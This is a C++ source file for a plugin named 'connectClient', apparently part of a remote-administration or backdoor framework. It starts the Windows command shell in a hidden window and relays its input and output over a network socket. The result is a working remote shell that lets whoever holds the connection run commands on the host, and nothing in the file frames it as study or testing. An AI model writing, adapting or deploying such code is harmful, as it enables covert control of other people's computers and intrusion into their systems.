#include "..\include\globalDefine.h"
#include "..\include\serverStruct.h"
#include "..\include\fliter.h"
class connectClient : public PluginNamespace::pluginBase
{
public:
      bool runFun(PluginNamespace::PluginInfo &info) override
      {
            auto pluginInfo = std::static_pointer_cast<PluginInfoStruct>(info.cus->data[0]);
            return (open_telnet(*info.mainConnectSocket) == SUCCESS_OPERAT);
      }
      connectClient()
      {
            this->used = true;
            this->pluginName = "connectClient";
            this->version = "1.0.0";
            this->author = "x3fang";
      }

private:
      int open_telnet(SOCKET &socket)
      {
            PROCESS_INFORMATION Processinfo;
            STARTUPINFO Startupinfo;
            HANDLE outputRead, outputWrite;
            HANDLE inputRead, inputWrite;
            SECURITY_ATTRIBUTES sa = {0};
            char szCMDPath[255] = {0};
            DWORD dwBytesRead = 0;
            DWORD dwBytesWrite = 0;

            sa.nLength = sizeof(sa);
            sa.bInheritHandle = TRUE;
            sa.lpSecurityDescriptor = NULL;
            // 创建标准输入/输出管道
            if (!CreatePipe(&outputRead, &outputWrite, &sa, 0) || !CreatePipe(&inputRead, &inputWrite, &sa, 0))
                  return GetLastError();
            // 分配内存资源，初始化数据
            ZeroMemory(&Processinfo, sizeof(PROCESS_INFORMATION));
            ZeroMemory(&Startupinfo, sizeof(STARTUPINFO));
            GetEnvironmentVariable("COMSPEC", szCMDPath, sizeof(szCMDPath));

            // 设置启动信息
            Startupinfo.cb = sizeof(STARTUPINFO);
            Startupinfo.wShowWindow = SW_HIDE;
            Startupinfo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
            Startupinfo.hStdInput = (HANDLE)inputRead;
            Startupinfo.hStdOutput = (HANDLE)outputWrite;
            Startupinfo.hStdError = (HANDLE)outputWrite;

            if (CreateProcess(NULL, szCMDPath, NULL, NULL, TRUE, 0, NULL, NULL, &Startupinfo, &Processinfo))
            {
                  CloseHandle(outputWrite);
                  CloseHandle(inputRead);
                  std::string buf;
                  buf = readPipeALLData(outputRead).first;
                  send(socket, buf);
                  while (WAIT_OBJECT_0 != WaitForSingleObject(Processinfo.hProcess, 5))
                  {
                        recv(socket, buf);
                        buf += "\r\n";
                        WriteFile(inputWrite, buf.c_str(), strlen(buf.c_str()), &dwBytesWrite, NULL);
                        if (WAIT_OBJECT_0 != WaitForSingleObject(Processinfo.hProcess, 5))
                        {
                              buf = readPipeALLData(outputRead).first;
                              send(socket, buf);
                        }
                        else
                        {
                              send(socket, "\r\n[exit]\r\n");
                              break;
                        }
                  }
            }
            else
            {
                  CloseHandle(Processinfo.hProcess);
                  CloseHandle(Processinfo.hThread);
                  return GetLastError();
            }

            // 关闭进程句柄
            CloseHandle(Processinfo.hProcess);
            CloseHandle(Processinfo.hThread);
            return SUCCESS_OPERAT;
      }
      std::pair<std::string, DWORD> readPipeALLData(HANDLE outputRead, int timeout_ms = 100)
      {
            std::string res;
            char cbuf[2048] = {0};
            DWORD dwBytesRead = 0, bytesAvailable = 0;
            do
            {
                  if (PeekNamedPipe(outputRead, NULL, 0, NULL, &bytesAvailable, NULL))
                  {
                        if (bytesAvailable > 0)
                        {
                              // 有数据可读
                              ReadFile(outputRead, cbuf, sizeof(cbuf) - 1, &dwBytesRead, NULL);
                              res += cbuf;
                              if (dwBytesRead == 0)
                                    break;
                        }
                  }
                  if (timeout_ms <= 0)
                        break;
                  else if (timeout_ms - 10 <= 0)
                        Sleep(timeout_ms);
                  else
                        Sleep(10);
                  timeout_ms -= 10;
                  memset(cbuf, 0, sizeof(cbuf));
            } while (timeout_ms > 0);

            memset(cbuf, 0, sizeof(cbuf));

            return make_pair(res, dwBytesRead);
      }
};
static connectClient Plugin_connectClient;
extern "C"
{
      EXPORT bool registerFun(PluginNamespace::PluginManager &pluginManager)
      {
            return pluginManager.registerFun(&Plugin_connectClient).first;
      }
}